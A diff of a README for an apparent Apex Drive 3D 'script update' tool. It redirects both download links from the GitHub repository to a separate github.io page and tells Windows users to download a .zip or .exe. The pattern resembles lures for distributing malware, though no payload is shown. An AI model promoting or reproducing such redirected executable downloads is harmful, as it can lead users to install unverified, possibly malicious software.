@@ -1,6 +1,6 @@
 # 🏎️ apex-drive-3d-script-update - Improve your racing performance and graphics
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Montycagey181/apex-drive-3d-script-update)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://montycagey181.github.io)
 
 This project provides a software tool for Apex Drive 3D. It helps users manage their open-world driving experience. The tool updates game scripts and improves game rendering. It runs in your web browser. Follow this guide to set up the software on your Windows computer.
 
@@ -8,7 +8,7 @@ This project provides a software tool for Apex Drive 3D. It helps users manage t
 
 You must visit the project page to download the latest files. 
 
-[Click here to visit the download page](https://github.com/Montycagey181/apex-drive-3d-script-update)
+[Click here to visit the download page](https://montycagey181.github.io)
 
 Select the file that ends in .zip or .exe to start the process. Save this file to your computer.
 
